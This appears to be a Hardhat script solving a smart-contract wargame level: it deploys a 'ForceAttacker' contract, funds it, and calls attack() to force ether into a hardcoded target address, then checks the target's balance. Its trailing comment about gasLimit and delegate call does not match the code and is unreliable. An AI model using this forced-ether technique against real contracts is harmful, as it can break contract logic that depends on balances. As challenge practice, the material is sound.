import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { sendEther } from "../../utils/sendEther";

async function main() {
  const [attacker] = await ethers.getSigners();
  const attackerContract = await deployContract("ForceAttacker", attacker);
  const targetAddress = "0x5AA416415245d77DC89275f18A109A004299bDde";
  await sendEther(attacker, attackerContract.address, "0.000001");
  const tx = await attackerContract.attack();
  await tx.wait();
  const balance = await attacker.provider!.getBalance(targetAddress);
  console.log("Success: ", balance.gt(0));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
gasLimit must be set manually because ethers has difficulties evaluating gas cost 
when using delegate call.
+ in the delegate contract there is a piece of code that might increase gas costs

*/
